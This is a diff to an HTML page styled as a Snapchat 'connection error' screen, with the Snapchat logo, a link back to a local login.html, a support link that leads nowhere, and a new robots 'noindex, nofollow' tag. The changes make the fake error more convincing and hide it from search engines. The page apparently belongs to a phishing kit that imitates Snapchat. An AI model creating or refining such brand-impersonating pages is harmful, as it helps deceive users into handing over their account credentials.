@@ -3,24 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - Service Issue</title>
+    <title>Snapchat - Connection Error</title>
+    <link rel="icon" type="image/png" href="Snapchat.png">
     <link rel="stylesheet" href="Snapchat.css">
+    <meta name="description" content="Snapchat connection error">
+    <meta name="robots" content="noindex, nofollow">
 </head>
 <body>
     <div class="container">
         <div class="language-container">
-            <button class="language-btn" onclick="toggleLanguageMenu()">🌐</button>
+            <button class="language-btn" onclick="toggleLanguageMenu()" aria-label="Change language">🌐</button>
             <div class="language-menu" id="language-menu">
-                <a href="#" onclick="setLanguage('en')">English</a>
-                <a href="#" onclick="setLanguage('fr')">Français</a>
+                <a href="#" onclick="setLanguage('en'); return false;">English</a>
+                <a href="#" onclick="setLanguage('fr'); return false;">Français</a>
             </div>
         </div>
         <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
-        <h1 id="title">Service Unavailable</h1>
-        <p class="error-message" id="error-message">We’re currently experiencing technical difficulties with our servers.</p>
-        <p id="error-subtitle">Please try again later. We’re working hard to resolve this issue as quickly as possible.</p>
-        <a href="login.html" class="back-link" id="back-link">Return to Login</a>
-        <p class="support-text" id="support-text">Need help? Contact support@snapchat.com</p>
+        <h1 id="title">Something went wrong</h1>
+        <p class="error-message" id="error-message">We're having trouble connecting to Snapchat servers right now.</p>
+        <p id="error-subtitle">Please check your internet connection and try again in a few moments.</p>
+        <a href="login.html" class="back-link" id="back-link">Try Again</a>
+        <p class="support-text" id="support-text">Need help? Visit our <a href="#" onclick="return false;">Help Center</a></p>
     </div>
     <script src="script.js"></script>
 </body>
